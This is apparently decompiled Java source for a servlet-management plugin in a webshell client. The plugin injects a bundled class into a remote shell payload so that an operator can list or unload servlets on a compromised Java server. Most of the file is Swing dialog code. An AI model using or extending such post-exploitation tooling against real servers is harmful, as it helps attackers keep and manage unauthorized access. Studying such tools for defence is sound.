package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import core.ui.component.RTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.InputStream;

@PluginnAnnotation(Name = "ServletManage", payloadName = "JavaDynamicPayload")
public class ServletManage implements Plugin {
    private static final String CLASS_NAME = "plugin.ServletManage";
    private final JButton getAllServletButton = new JButton("GetAllServlet");
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea resultTextArea = new RTextArea();
    private final JButton unLoadServletButton = new JButton("UnLoadServlet");
    /* access modifiers changed from: private */
    public JSplitPane splitPane = new JSplitPane();
    private Encoding encoding;
    private boolean loadState;
    private Payload payload;
    private ShellEntity shellEntity;

    public ServletManage() {
        this.splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.getAllServletButton);
        topPanel.add(this.unLoadServletButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            /* class shells.plugins.java.ServletManage.AnonymousClass1 */

            public void componentResized(ComponentEvent e) {
                ServletManage.this.splitPane.setDividerLocation(0.15d);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void getAllServletButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.setText(getAllServlet());
    }

    private void unLoadServletButtonClick(ActionEvent actionEvent) {
        UnServlet unServlet = new UnLoadServletDialog(this, this.shellEntity.getFrame(), "UnLoadServlet", "", "", null).getResult();
        if (unServlet.state) {
            String resultString = unLoadServlet(unServlet.wrapperName, unServlet.urlPattern);
            Log.log(resultString);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        Log.log("用户取消选择.....");
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/ServletManage.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success");
                    return;
                }
                Log.log("Load fail");
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private String getAllServlet() {
        load();
        return this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "getAllServlet", new ReqParameter()));
    }

    private String unLoadServlet(String wrapperName, String urlPattern) {
        load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("wrapperName", wrapperName);
        reqParameter.add("urlPattern", urlPattern);
        return this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "unLoadServlet", reqParameter));
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.panel;
    }

    class UnServlet {
        public boolean state;
        public String urlPattern;
        public String wrapperName;

        UnServlet() {
        }
    }

    class UnLoadServletDialog extends JDialog {
        private final Dimension TextFieldDim;
        private final JButton cancelButton;
        private final JButton okButton;
        private final UnServlet unServlet;
        private final JLabel urlPatternLabel;
        private final JTextField urlPatternTextField;
        private final JLabel wrapperNameLabel;
        private final JTextField wrapperNameTextField;

        private UnLoadServletDialog(Frame frame, String tipString, String wrapperNameString, String urlPatternString) {
            super(frame, tipString, true);
            this.TextFieldDim = new Dimension(500, 23);
            this.unServlet = new UnServlet();
            this.wrapperNameTextField = new JTextField("wrapperNameText", 30);
            this.urlPatternTextField = new JTextField("destText", 30);
            this.wrapperNameLabel = new JLabel("wrapperName");
            this.urlPatternLabel = new JLabel("urlPattern");
            this.okButton = new JButton("unLoad");
            this.cancelButton = new JButton("cancel");
            Dimension TextFieldDim2 = new Dimension(200, 23);
            GBC gbcLSrcFile = new GBC(0, 0).setInsets(5, -40, 0, 0);
            GBC gbcSrcFile = new GBC(1, 0, 3, 1).setInsets(5, 20, 0, 0);
            GBC gbcLDestFile = new GBC(0, 1).setInsets(5, -40, 0, 0);
            GBC gbcDestFile = new GBC(1, 1, 3, 1).setInsets(5, 20, 0, 0);
            GBC gbcOkButton = new GBC(0, 2, 2, 1).setInsets(5, 20, 0, 0);
            GBC gbcCancelButton = new GBC(2, 2, 1, 1).setInsets(5, 20, 0, 0);
            this.wrapperNameTextField.setPreferredSize(TextFieldDim2);
            this.urlPatternTextField.setPreferredSize(TextFieldDim2);
            setLayout(new GridBagLayout());
            add(this.wrapperNameLabel, gbcLSrcFile);
            add(this.wrapperNameTextField, gbcSrcFile);
            add(this.urlPatternLabel, gbcLDestFile);
            add(this.urlPatternTextField, gbcDestFile);
            add(this.okButton, gbcOkButton);
            add(this.cancelButton, gbcCancelButton);
            automaticBindClick.bindJButtonClick(this, this);
            addWindowListener(new WindowListener() {
                /* class shells.plugins.java.ServletManage.UnLoadServletDialog.AnonymousClass1 */

                public void windowOpened(WindowEvent paramWindowEvent) {
                }

                public void windowIconified(WindowEvent paramWindowEvent) {
                }

                public void windowDeiconified(WindowEvent paramWindowEvent) {
                }

                public void windowDeactivated(WindowEvent paramWindowEvent) {
                }

                public void windowClosing(WindowEvent paramWindowEvent) {
                    UnLoadServletDialog.this.cancelButtonClick(null);
                }

                public void windowClosed(WindowEvent paramWindowEvent) {
                }

                public void windowActivated(WindowEvent paramWindowEvent) {
                }
            });
            this.wrapperNameTextField.setText(wrapperNameString);
            this.urlPatternTextField.setText(urlPatternString);
            setSize(650, 180);
            setLocationRelativeTo(frame);
            setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
            setVisible(true);
        }

        /* synthetic */ UnLoadServletDialog(ServletManage servletManage, Frame frame, String str, String str2, String str3, UnLoadServletDialog unLoadServletDialog) {
            this(frame, str, str2, str3);
        }

        public UnServlet getResult() {
            return this.unServlet;
        }

        private void okButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = true;
            changeFileInfo();
        }

        /* access modifiers changed from: private */
        public void cancelButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = false;
            changeFileInfo();
        }

        private void changeFileInfo() {
            this.unServlet.urlPattern = this.urlPatternTextField.getText();
            this.unServlet.wrapperName = this.wrapperNameTextField.getText();
            dispose();
        }
    }
}